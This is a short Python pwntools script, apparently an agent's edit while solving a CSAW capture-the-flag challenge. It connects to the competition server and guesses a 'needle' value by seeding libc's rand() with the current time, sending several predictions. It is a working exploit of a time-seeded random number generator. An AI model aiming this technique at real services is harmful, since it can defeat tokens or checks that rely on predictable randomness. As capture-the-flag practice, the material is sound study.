import ctypes
import time
from pwn import *

libc = ctypes.CDLL("libc.so.6")

def needle(seed):
    libc.srand(seed)
    return libc.rand() % 0x100000

context.log_level = 'error'

p = remote("pwn.chal.csaw.io", 5000, timeout=5)
print(p.recvuntil(b"check?\n", timeout=5))
base = int(time.time())
for i in range(3):
    guess = needle(base + i)
    print("trying", base+i, guess)
    p.sendline(str(guess).encode())
    resp = p.recvuntil(b"check?\n", timeout=3)
    print(resp)
p.close()
end_of_edit

